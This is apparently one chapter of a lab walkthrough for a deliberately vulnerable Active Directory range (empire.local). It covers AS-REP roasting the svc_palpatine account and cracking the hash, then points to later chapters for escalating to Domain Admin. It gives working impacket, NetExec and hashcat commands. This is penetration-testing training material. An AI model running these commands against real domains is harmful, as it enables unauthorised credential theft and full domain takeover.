# 03 — AS-REP roast (svc_palpatine) → credential → DA

**Start:** network access to the DC + a list of usernames (no password needed).
**Goal:** crack `svc_palpatine`, then escalate as in §02/§05.
**Why it works:** accounts with "do not require Kerberos pre-authentication" set
will hand out an AS-REP encrypted with the account's password hash to *anyone*
who asks — no credential required. The lab sets this on `svc_palpatine`.

---

## Step 1 — Roast without auth

Targeted (you know the account):
```bash
impacket-GetNPUsers empire.local/svc_palpatine -no-pass -dc-ip 10.10.0.10 -format hashcat
```

Sweep (find every no-preauth account):
```bash
nxc ldap 10.10.0.10 -u '' -p '' --asreproast asrep.txt
# or with any valid cred to enumerate first:
impacket-GetNPUsers empire.local/<user>:<pw> -request -dc-ip 10.10.0.10 -format hashcat
```

## Step 2 — Crack

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Step 3 — Use the credential

`svc_palpatine` is a foothold user. Escalate via the same routes:
- ADCS ESC1 cert for Administrator → `05-adcs-esc1-esc8.md`
- BloodHound shortest-path to a DA group → likely lands on the
  `sheev.palpatine` GenericAll edge (`04-acl-sheev-palpatine-dcsync.md`).

```bash
nxc smb 10.10.0.10 -u svc_palpatine -p <cracked> --shares   # confirm + recon
```

---

**Outcome:** a usable domain credential. **Next:** §04 or §05 to reach DA.
